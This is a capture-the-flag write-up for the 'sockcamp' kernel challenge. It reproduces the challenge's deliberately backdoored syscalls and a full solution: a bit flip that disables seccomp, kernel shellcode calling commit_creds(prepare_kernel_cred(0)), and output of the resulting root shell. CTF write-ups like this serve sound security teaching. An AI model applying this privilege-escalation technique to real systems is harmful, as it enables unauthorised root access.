# sockcamp

Somebody added a suspicious syscall to my kernel...  
No problem! I blocked it with seccomp and now nobody can use it ;)

```  
nc 35.224.135.84 1003  
```

Note: You can use the attached SDK to compile your exploit

Attachments:  
- `sockcamp.zip`  
- `x86_64-buildroot-linux-uclibc_sdk-buildroot.tar.gz`

## Overview

We have two custom syscalls defined.

```c  
#include <linux/kernel.h>  
#include <linux/syscalls.h>

#define __NR_FLIP 555  
#define __NR_INJECT 556

unsigned long flips = 0;

SYSCALL_DEFINE2(flip, unsigned long, offset, unsigned char, bit)  
{  
	if (flips > 0 || offset >= sizeof(struct task_struct) || bit >= 8) {  
		printk(KERN_ALERT "[backdoor] No\n");  
		return -EPERM;  
	}

	((unsigned char *)current)[offset] ^= (1 << (bit));  
	flips++;

	return 0;  
}

typedef void func(void);

SYSCALL_DEFINE2(inject, void *, addr, unsigned long, len)  
{  
	void *buf;  
	buf = __vmalloc(128, GFP_KERNEL, PAGE_KERNEL_EXEC);  
	if (len < 128) {  
		if (copy_from_user(buf, addr, len) == 0) {  
			printk(KERN_INFO  
			       "[backdoor] Copied %lu bytes from userland\n",  
			       len);  
		}  
		((func *)buf)();  
	}

	return 0;  
}  
```

Unfortunately the `inject` syscall is blocked by seccomp.

## Solution

### Step 1

Disable seccomp with a single bit-flip in the current `task_struct` using
syscall 555:

```c  
current->thread_info.flags &= ~_TIF_SECCOMP;  
```

Explanation: https://youtu.be/mKzUA3j6myg

### Step 2

Execute `commit_creds(prepare_kernel_cred(0))` using syscall 556 to escalate  
 privileges. KASLR is disabled so the addresses are fixed. See `inject.py` to  
 see how to assemble the code.

---

Final exploit in `solve.c`:  
```c  
int main() {  
   int r;

   printf("[solve] Escaping seccomp");  
   unsigned long offset = 1;  
   unsigned long bit = 0;  
   r = syscall(555, offset, bit);  
   assert(r == 0);

   printf("[solve] UID before escalating privs: %d\n", getuid());

   char escalate_privs[31] = {0x48, 0x31, 0xff, 0x48, 0xb9, 0xc0, 0x81, 0x08,  
                              0x81, 0xff, 0xff, 0xff, 0xff, 0xff, 0xd1, 0x48,  
                              0x89, 0xc7, 0x48, 0xb9, 0x80, 0x7e, 0x08, 0x81,  
                              0xff, 0xff, 0xff, 0xff, 0xff, 0xd1, 0xc3};

   r = syscall(556, escalate_privs, 31);  
   printf("[solve] syscall(556) = %d\n", r);  
   assert(r == 0);

   printf("[solve] UID after escalating privs: %d\n", getuid());  
   assert(getuid() == 0);

   // This child process should still be seccomped, but it doesn't matter  
   execlp("/bin/sh", "/bin/sh", NULL);

   return 0;  
}  
```

Output:

```  
$ python3 client.py HOST=35.224.135.84 PORT=1003 EXPLOIT=solve  
[x] Opening connection to 35.224.135.84 on port 1003  
[x] Opening connection to 35.224.135.84 on port 1003: Trying 35.224.135.84  
[+] Opening connection to 35.224.135.84 on port 1003: Done  
[*] Solving PoW ...  
[DEBUG] Received 0x34 bytes:  
   b'Send the output of: hashcash -mb26 gsji19cJeCDSmj8N\n'  
[+] Solved PoW  
[DEBUG] Sent 0x35 bytes:  
   b'1:26:210613:gsji19cjecdsmj8n::kjm3fW3I7ePrO41C:4GYop\n'  
rt  
...  
$ chmod +x solve  
$ ./solve  
./solve  
[solve] Sanity check: syscall 556 should be blocked[solve] syscall(556) = -1  
[solve] Escaping seccomp[solve] syscall(555) = 0  
[solve] UID before escalating privs: 1000  
[   22.705578] [backdoor] Copied 31 bytes from userland  
[solve] syscall(556) = 0  
[solve] UID after escalating privs: 0  
/bin/sh: can't access tty; job control turned off  
$ id  
id  
uid=0(root) gid=0(root)  
$ cat /flag  
cat /flag  
CCC{n0t_r3ally_4_r0wh4mm3r_ch3ll3ng3}  
```  

Original writeup
(https://github.com/qxxxb/ctf_challenges/blob/master/2021/ccc/pwn/sockcamp/solve).